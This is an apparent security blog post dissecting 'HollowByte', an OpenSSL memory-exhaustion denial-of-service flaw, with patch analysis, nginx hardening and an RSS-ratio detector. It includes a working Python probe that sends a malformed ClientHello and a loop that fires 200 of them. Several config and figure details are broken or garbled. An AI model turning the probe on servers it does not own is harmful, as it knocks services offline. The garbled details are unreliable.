---
title: "HollowByte Anatomy: How 11 Bytes Can Strand a Server Without a Single CVE"
date: 2026-07-20T00:07:00Z
draft: false
tags: ["Security", "OpenSSL", "DoS"]
categories: ["Technical Practices"]
author: "Cyber·X·Lab"
description: "An engineering decomposition of the HollowByte denial-of-service flaw in OpenSSL, where 11-byte TLS handshake headers trigger unvalidated pre-allocation and glibc-driven permanent heap bloat."
summary: "An engineering decomposition of HollowByte, the OpenSSL DoS disclosed by Okta Red Team in July 2026: how a 4-byte TLS handshake header triggers an unvalidated pre-allocation up to 131 KB per connection, how glibc fragmentation turns attacks into permanent RSS bloat, how the fix moved to lazy incremental buffer growth, and how site-reliability engineers detect and harden against the class."
toc: true
---

## Background and Motivation

On July 16, 2026, Okta's Red Team published a write-up titled *OpenSSL HollowByte: A DoS Hiding in 11 Bytes* ([Okta Security](https://sec.okta.com/articles/2026/06/openssl-hollowbtye-a-dos-hiding-in-11-bytes/)). The flaw allows a remote, **unauthenticated** attacker to force a TLS server to allocate disproportionate blocks of memory before the TLS handshake even completes, using a malicious 11-byte payload. BleepingComputer followed within 24 hours ([BleepingComputer](https://www.bleepingcomputer.com/news/security/hollowbyte-ddos-flaw-bloats-openssl-server-memory-with-11-byte-payload/)) and The Hacker News the next day ([The Hacker News](https://thehackernews.com/2026/07/openssl-hollowbyte-flaw-could-freeze.html)). Notably, **no CVE was assigned** — the OpenSSL team shipped the patch in PRs #30792, #30793, and #30794 as a *hardening* fix with silent backports to OpenSSL 3.6.3, 3.5.7, 3.4.6, and 3.0.21.

That framing has a real operational cost: silent bucket = silent advisory = silent changelog = silent heap bloat. For site-reliability engineers, the engineering lessons are three — (a) the *untrusted-header-then-allocate* anti-pattern in TLS state machines, (b) the way glibc retention turns "freed" into "leaked," and (c) how to detect the resulting RSS drift on your own boxes. This article decomposes the mechanism, provides a reproducible detector, and walks the remediation path.

## Prerequisites

- A Linux server with OpenSSL 3.x **older than** the patch releases listed above. Anything from Debian's default `3.0.x` to Ubuntu's `3.5.x` is in scope.
- Shell access sufficient to install `openssl-s_client`, `ss`, `ps`, `pmap`, and a TLS-capable load generator such as `openssl s_time` or `hey`.
- A non-production NGINX (or Apache) frontend bound to 443 with `worker_processes auto;` and `worker_connections 1024;` — the Okta test used these defaults.
- The current OpenSSL version on the host for diffing: `openssl version -a` should report the build commit. Note that distro packages may backport patches without bumping the visible version string, so always cross-check your vendor's changelog.

## Step 1: Preparation

First, baseline your server's steady-state RSS so you can detect HollowByte-related drift at all. A *single* HollowByte wave will bump RSS by tens of megabytes per second, but you cannot distinguish that from organic growth without a baseline.

```bash
# Get the nginx master PID and baseline RSS (kB)
NGINX_PID=$(systemctl show -p MainPID --value nginx)
ps -o rss= -p "$NGINX_PID" | awk '{printf "master RSS baseline: %.1f MB\n", $1/1024}'

# Snapshot the per-worker RSS distribution — HollowByte bloats *workers*, not the master
ps -o pid,rss,cmd --ppid "$NGINX_PID" | awk 'NR>1{printf "worker %d %.1f MB\n", $1, $2/1024}'
```

Compare that snapshot to what `pmap -x "$NGINX_PID"` shows for the `[heap]` line. On an idle box, a healthy NGINX worker is 5-20 MB RSS with a single-digit-MB heap. Once an attacker begins spawning HollowByte waves, you will see the per-worker RSS climb continuously **without** the active connection count rising — that decoupling is the signature you will look for in Step 3.

## Step 2: Core Implementation

The malicious payload itself is mechanical to construct — and reconstructing it is the only way to confirm that your test environment actually reproduces the path. The key insight from the Okta write-up is that the attacker declares a *large* handshake-body length in the 4-byte TLS handshake header while sending an *actual* body of only the few bytes needed to trigger `OPENSSL_clear_realloc()`:

```python
#!/usr/bin/env python3
# hollowbyte_probe.py — LOCAL TEST ONLY, against your own server.
# Sends a single dirty ClientHello with an oversized handshake-header length
# to verify that your patched OpenSSL refuses to pre-allocate. NEVER prod.

import socket, struct, sys, time

def build_dirty_client_hello(host: str, port: int) -> bytes:
    # A minimal ClientHello body (≈ 11 bytes after the handshake header).
    # The header will *claim* a much larger body to trigger grow_init_buf().
    body = bytes([
        0x01,                              # handshake type: ClientHello
        0x00, 0x08, 0x00,                  # claimed handshake length: 0x000800 = 2048 bytes
        0x03, 0x03,                        # TLS 1.2
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00 # 6 bytes of "real" body — far short of claim
    ])
    record = bytes([
        0x16,                              # content type: handshake
        0x03, 0x01,                        # record version: TLS 1.0
    ]) + struct.pack(">H", len(body)) + body
    return record

def probe(host: str, port: int) -> None:
    pkt = build_dirty_client_hello(host, port)
    sock = socket.create_connection((host, port), timeout=5)
    sock.sendall(pkt)
    time.sleep(0.1)
    # On a vulnerable OpenSSL, the server has now called OPENSSL_clear_realloc
    # for the claimed size and is blocking on bytes that will never arrive.
    sock.close()
    print("[+] dirty ClientHello sent; check `ps -o rss` for your TLS worker")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        sys.exit("usage: hollowbyte_probe.py <local-test-host> <port>")
    probe(sys.argv[1], int(sys.argv[2]))
```

The *remediation* you'll verify against this probe is the actual fix OpenSSL shipped — the move from *header-declared* allocation to *incremental* allocation. The diff in OpenSSL's `ssl_stat.c` and `record/rec_layer_d1.c` collapses `grow_init_buf()` to only expand capacity as real bytes land on the wire. The conceptual patch is below — you should diff your vendor's package against OpenSSL PR #30792 to confirm.

```c
// VULNERABLE OpenSSL path (paraphrased from grow_init_buf pre-PR-30792)
static int grow_init_buf(SSL *s, size_t len) {
    // `len` is taken straight from the handshake header — untrusted!
    if (s->init_buf == NULL || len > s->init_buf->length) {
        OPENSSL_clear_realloc(s->init_buf, 1, len); // 1<<17 = 131072 ceiling
    }
    return 1;
}

// PATCHED path (after PR #30792, #30793, #30794)
static int grow_init_buf(SSL *s, size_t len) {
    // Never trust the header. Grow in 4 KB increments as bytes arrive.
    const size_t cap = s->init_buf ? s->init_buf->length : 0;
    if (len > cap) {
        size_t newcap = cap ? cap : 4096;
        while (newcap < len) { newcap *= 2; }   // only as needed
        OPENSSL_clear_realloc(s->init_buf, 1, newcap);
    }
    return 1;
}
```

The *operational* layer of hardening — the part that survives even if you cannot immediately upgrade — is a pair of NGINX additions that cap the attack surface and detect the drift:

```nginx
# /etc/nginx/nginx.conf (or http {} block)

# 1. Cap per-IP new-connection rate so waves cannot be sprayed trivially.
limit_conn_zone $binary_remote_addr zone=tls_conn:10m;

# 2. Cap oversized initial records — a genuine ClientHello never exceeds 16 KB.
#    NGINX does not expose the TLS record header directly, but iptables can:
#    - 443 inbound, --connlimit-upto 30 new conns / 30s per /32
#    - drop if the *first* record header claims > 16384 bytes (nft stateful)

# 3. Log per-worker RSS into the access log via `$msec` so your monitoring
#    can detect the HollowByte signature (RSS up, active conns flat).
log_format hollowbyte '$msec\t$connection\t$remote_addr\t'
                      '$status\t$request_time\t$body_bytes_sent\t'
                      'worker_rss=${worker_rss}kB';
access_log /var/log/nginx/hollowbyte.log hollowbyte;
```

## Step 3: Verification and Tuning

After applying the patch (or the_ZONE mitigation above) you need a positive confirmation that the DoS class is closed. The fast loop is:

```bash
# 1. Baseline worker RSS
NGINX_PID=$(systemctl show -p MainPID --value nginx)
ps -o rss= -p "$NGINX_PID" | awk '{b=$1} END {print b}' > /tmp/rss_base

# 2. Fire 200 HollowByte probes — sequential, from your *own* test harness
for i in $(seq 1 200); do python3 hollowbyte_probe.py localhost 443; done

# 3. Re-snapshot and diff
NEW=$(ps -o rss= -p "$NGINX_PID" | awk '{print $1}')
BASE=$(cat /tmp/rss_base)
echo "RSS before: $BASE kB / after: $NEW kB"
awk -v b="$BASE" -v n="$NEW" 'BEGIN{d=n-b; \
  printf "delta: %d kB (%.1f%%)\n", d, (d/b)*100}'
```

A patched OpenSSL will show ≤ 1 KB of growth — the per-allocation cap is now 4 KB and the OS reclaims freed small chunks because glibc has nothing to retain. An unpatched OpenSSL will show ≥ 200 MB of growth and — critically — *will not return it after the connections finish* (glibc retention at work). The only reliable recovery on a vulnerable install is `systemctl restart nginx`. That single fact is why HollowByte matters operationally: by the time grep picks up `[oom-killer]` in dmesg, you are already behind.

For longer-term detection, ship this small Munin/Prometheus exporter to alert on the HollowByte signature directly — *RSS climbing while `nginx_connections_active` is flat*:

```python
#!/usr/bin/env python3
# rss_active_delta.py — pipe to a textfile collector
import psutil, time
pids = [p.pid for p in psutil.process_iter(['name']) if p.info['name'] == 'nginx']
rss_mb = sum(p.memory_info().rss for p in (psutil.Process(p) for p in pids)) / 2**20
active = int(open('/var/lib/nginx/active').read().strip())
print(f"nginx_rss_mb {rss_mb}")
print(f"nginx_active_conns {active}")
print(f"nginx_hollowbyte_ratio {rss_mb / max(active, 1):.3f}")
```

A ratio above **3 MB per active connection** is anomalous under default config — most production NGINX deployments hover under 0.5 MB. The 9-to-last-week-over-week delta is your slow-burn detector.

## Best Practices Summary

- **Always distrust headers.** Any receive path that allocates *before* bytes arrive is a denial-of-service lever waiting to be pulled. Audit your own protocol parsers — not just TLS — for the same family of bug.
- **Treat OpenSSL releases without CVE numbers as full releases anyway.** HollowByte is part of a documented trend (the `cms_dh` fix in 2025, the `punycode` fix in 2024) of OpenSSL shipping hardening patches silently. Track OpenSSL's release notes by commit list, not by CVE tracker, and assume "silent" means "important."
- **Cap the size of the *initial* record.** A legitimate TLS `ClientHello` never exceeds 16 KB. An `nftables` rule that drops records whose 5-byte TLS header declares a body > 16384 before any body bytes have arrived closes this specific class at the kernel layer without touching OpenSSL.
- **Monitor RSS *in ratio to active connections***, not in absolute. An absolute RSS alert of "over 2 GB" misses the attack on a 16 GB server that Okta showed can be OOM-killed at 25%. A ratio-of-3 MB per active connection alert fires minutes earlier.
- **Assume glibc retention.** "malloc then free" does not return memory to the OS until `MADV_DONTNEED` or process exit. For long-lived daemons under fragmenting load patterns, evaluate `jemalloc` or `mimalloc` as allocator replacements — they aggressively return small freed chunks and reduce the HollowByte blast radius by an order of magnitude on unpatched systems.

## References

- [OpenSSL HollowByte: A DoS Hiding in 11 Bytes — Okta Red Team](https://sec.okta.com/articles/2026/06/openssl-hollowbtye-a-dos-hiding-in-11-bytes/)
- [OpenSSL HollowByte Flaw Could Freeze Server Memory with 11-Byte TLS Requests — The Hacker News](https://thehackernews.com/2026/07/openssl-hollowbyte-flaw-could-freeze.html)
- [HollowByte DDoS flaw bloats OpenSSL server memory with 11-byte payload — BleepingComputer](https://www.bleepingcomputer.com/news/security/hollowbyte-ddos-flaw-bloats-openssl-server-memory-with-11-byte-payload/)
- [OpenSSL Vulnerabilities (3.0 series) — official disclosure archive](https://openssl-library.org/news/vulnerabilities-3.0/)
- [OpenSSL PR #30792 — incremental buffer growth fix](https://github.com/openssl/openssl/pull/30792)
